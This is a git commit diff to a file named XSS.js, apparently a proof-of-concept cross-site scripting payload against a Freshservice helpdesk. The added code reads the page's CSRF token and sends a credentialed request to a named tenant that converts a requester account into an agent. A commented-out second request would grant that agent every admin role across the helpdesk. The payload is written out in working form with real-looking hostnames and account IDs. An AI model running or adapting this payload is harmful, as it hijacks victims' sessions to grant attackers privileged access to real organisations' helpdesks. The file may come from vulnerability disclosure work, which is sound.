2ea162ee2b91dbd6e0e59057ab7c6c7e4c478395
sureela <42230835+sureela@users.noreply.github.com>
2025-02-06 20:37:26 +0530

    Update XSS.js
    to make agent

--- XSS.js
+++ XSS.js
@@ -1,6 +1,31 @@
 async function sendRequests() {
     try {
-        alert(99);
+        // First step call Csrf-Token by create variable and used var name in the headers
+        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+        // Execute POST request that convert requester ==> Agent 
+        await fetch('https://fsbhelpdesk.freshservice.com/itil/requesters/56000627108/make_agent', {
+            method: 'POST',
+            credentials: 'include',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-Csrf-Token': csrfToken
+            },
+            body: '_method=put'
+        });
+
+        // // Execute PUT request that convert Agent ==> account admin
+        // await fetch('https://h1-h00.freshservice.com/api/_/agents/59000349414/map_workspace_groups_and_roles', {
+        //     method: 'PUT',
+        //     credentials: 'include',
+        //     headers: {
+        //         'Content-Type': 'application/json',
+        //         'X-Csrf-Token': csrfToken
+        //     },
+        //     body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":59000089955,"assignment_scope":"entire_helpdesk"},{"role_id":59000089956,"assignment_scope":"entire_helpdesk"},{"role_id":59000089957,"assignment_scope":"entire_helpdesk"},{"role_id":59000089958,"assignment_scope":"entire_helpdesk"},{"role_id":59000089959,"assignment_scope":"entire_helpdesk"},{"role_id":59000089960,"assignment_scope":"entire_helpdesk"}],"workspace_id":2}`
+        // });
+
+        // console.log('Requests completed successfully');
     } catch (error) {
         console.error('Error:', error);
     }
